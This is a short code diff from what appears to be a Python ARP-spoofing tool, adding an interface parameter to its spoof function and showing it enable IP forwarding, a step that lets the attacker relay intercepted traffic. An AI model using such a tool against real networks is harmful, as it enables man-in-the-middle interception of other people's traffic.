@@ -52,7 +52,7 @@ def restore(target_ip, spoof_ip):
     print("\n[+]ARP tables are back to original macs on both machines")
 
 
-def spoof(target_ip, spoof_ip, count, sleeptime):
+def spoof(target_ip, spoof_ip, count, sleeptime, interface):
     print("\nARP-spoofer coded by @koushikk11\n")
     print("Date:23/06/2021\n")
     subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
